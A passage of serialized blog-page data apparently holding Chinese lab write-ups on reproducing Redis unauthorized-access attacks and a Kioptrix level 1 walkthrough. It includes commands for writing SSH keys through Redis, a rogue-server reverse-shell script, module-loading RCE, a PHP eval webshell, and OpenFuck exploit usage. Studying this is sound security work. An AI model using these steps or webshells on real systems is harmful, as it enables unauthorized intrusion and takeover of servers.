style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; crackit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;连接目标,设置redis配置文件&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /root/.ssh/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; get&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dbfilename&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;authorized_keys\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;save&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;利用私钥连接目标&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;ssh root@192.168.124.5 -i ~/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;\n&lt;p&gt;不适用于vulhub靶场&lt;/p&gt;\n&lt;h1 id=\&quot;利用主从复制rce\&quot;&gt;利用主从复制rce&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#利用主从复制rce\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;方法一利用脚本\&quot;&gt;方法一：利用脚本&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法一利用脚本\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://github.com/n0b0dyCN/redis-rogue-server\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GitHub - n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE - github.com\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://github.com/fluidicon.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;github.com&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GitHub - n0b0dyCN/redis-rogue-server: Redis(&amp;#x3C;=5.0.5) RCE&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;Redis(&amp;#x3C;=5.0.5) RCE. Contribute to n0b0dyCN/redis-rogue-server development by creating an account on GitHub.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://github.com/n0b0dyCN/redis-rogue-server&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://opengraph.githubassets.com/c425d5e75c4171d528e4cfb212b3905d02d629a35229b6ba9acfbfa096317ed6/n0b0dyCN/redis-rogue-server\&quot; alt=\&quot;GitHub - n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;nc&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -lvvp&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 9999&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;./redis-rogue-server.py&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; --rhost&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; --lhost&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面选反弹shell&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/25.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;方法二手动执行操作失败脚本文件\&quot;&gt;方法二：手动执行(操作失败)脚本文件&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法二手动执行操作失败脚本文件\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; ping&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; config set dir ./ &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 设置redis的备份路径为当前目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; config set dbfilename exp.so &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 设置备份文件名为exp.so，默认为dump.rdb&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; slaveof 192.168.10.1 9999 &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 设置主服务器IP和端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; module load ./exp.so &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 加载恶意模块&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; slaveof no one &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 切断主从，关闭复制功能&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; system.exec &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;whoami&#39;&lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt; # 执行系统命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; config set dbfilename dump.rdb &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 通过dump.rdb文件恢复数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; system.exec &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;rm ./exp.so&#39;&lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt; # 删除exp.so&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; module unload system &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 卸载system模块的加载&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;redis写webshell\&quot;&gt;redis写webshell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#redis写webshell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）&lt;/p&gt;\n&lt;p&gt;这里由于本地搭建，我们已经知道目录，我们把shell写入/home/bmjoker/目录下：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /home/bmjoker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dbfilename&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; redis.php&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; x&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\r\\n\\r\\n&amp;#x3C;?php phpinfo();?&gt;\\r\\n\\r\\n\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;save&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;当数据库过大时，redis写shell的小技巧：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;php\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;php&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; set_time_limit&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;0&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;); $fp&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;fopen&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;bmjoker.php&#39;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;,&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;w&#39;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;); &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;fwrite&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;($fp,&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;&amp;#x3C;?php @eval($_POST[\\\&quot;bmjoker\\\&quot;]);?&gt;&#39;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;); &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;exit&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(); &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;计划任务反弹shell仅适用于centos&quot;],&quot;text&quot;:[0,&quot;计划任务反弹shell（仅适用于centos）&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssh-key公钥登录服务器&quot;],&quot;text&quot;:[0,&quot;ssh-key公钥登录服务器&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;利用主从复制rce&quot;],&quot;text&quot;:[0,&quot;利用主从复制rce&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;方法一利用脚本&quot;],&quot;text&quot;:[0,&quot;方法一：利用脚本&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;方法二手动执行操作失败脚本文件&quot;],&quot;text&quot;:[0,&quot;方法二：手动执行(操作失败)脚本文件&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;redis写webshell&quot;],&quot;text&quot;:[0,&quot;redis写webshell&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/25.PNG&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Redis未授权访问&quot;],&quot;date&quot;:[3,&quot;2023-01-18T18:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;未授权访问&quot;],[0,&quot;Redis&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/25.PNG&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/3&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;reproduction/metasploitable-2&quot;],&quot;prevPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-1&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -T4 -sV -O 192.168.124.140 -p-\nnmap --script vuln 192.168.124.140 -p-\ndirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt\n```\n# Method-1  Samba\n![](img/1679306030928.png)\nAttentions please,meterpreter is not availiable\nIt&#39;s root.There is no need to escalate privilege.\n\n# Method-2 OpenFuck mod_ssl vulnerability\n```\nsearchsploit mod_ssl 2.8.4\n```\n![](img/1679366939593.png)\n```\nsearchsploit -p 47080\n```\n\n![](img/1679366949376.png)\n\n![](img/1679366954478.png)\nWe need install libssl-dev first.\n```\ngcc -o OpenFuck 47080.c -lcrypto\n./OpenFuck\n./OpenFuck 0x6b 192.168.124.140 443 -c 40\n```\nThere are some errors in compile process.\n\n# Enclosure\n![](img/1678960944499.png)\n\n![](img/1678960950947.png)\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners: \n|   cpe:/a:openbsd:openssh:2.9p2: \n|       CVE-2002-0640   10.0    https://vulners.com/cve/CVE-2002-0640\n|       CVE-2002-0639   10.0    https://vulners.com/cve/CVE-2002-0639\n|       CVE-2002-0083   10.0    https://vulners.com/cve/CVE-2002-0083\n|       CVE-2011-2895   9.3     https://vulners.com/cve/CVE-2011-2895\n|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051\n|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924\n|       CVE-2003-1562   7.6     https://vulners.com/cve/CVE-2003-1562\n|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478\n|       CVE-2002-0575   7.5     https://vulners.com/cve/CVE-2002-0575\n|       CVE-2001-1459   7.5     https://vulners.com/cve/CVE-2001-1459\n|       CVE-2001-1380   7.5     https://vulners.com/cve/CVE-2001-1380\n|       CVE-2001-0816   7.5     https://vulners.com/cve/CVE-2001-0816\n|       SECURITYVULNS:VULN:1956 7.2     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\n|       CVE-2001-0529   7.2     https://vulners.com/cve/CVE-2001-0529\n|       SSV:64479       5.0     https://vulners.com/seebug/SSV:64479    *EXPLOIT*\n|       SSV:6192        5.0     https://vulners.com/seebug/SSV:6192     *EXPLOIT*\n|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*\n|       SSV:16847       5.0     https://vulners.com/seebug/SSV:16847    *EXPLOIT*\n|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       *EXPLOIT*\n|       PACKETSTORM:54435       5.0     https://vulners.com/packetstorm/PACKETSTORM:54435       *EXPLOIT*\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    *EXPLOIT*\n|       EDB-ID:3303     5.0     https://vulners.com/exploitdb/EDB-ID:3303       *EXPLOIT*\n|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107\n|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243\n|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052\n|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    *EXPLOIT*\n|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    *EXPLOIT*\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    *EXPLOIT*\n|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       *EXPLOIT*\n|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537\n|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814\n|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327\n|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259\n|       SECURITYVULNS:VULN:1953 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\n|       SECURITYVULNS:VULN:1608 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\n|       SECURITYVULNS:VULN:1499 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\n|       SECURITYVULNS:VULN:1488 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\n|       SECURITYVULNS:VULN:1474 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\n|       SECURITYVULNS:VULN:1439 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\n|       SECURITYVULNS:VULN:1344 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\n|       SECURITYVULNS:VULN:1262 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\n|_      SECURITYVULNS:VULN:1233 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum: \n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|   /manual/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params: \n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://weakdh.org\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|       https://www.securityfocus.com/bid/74733\n|   \n|   Diffie-Hellman Key Exchange Insufficient 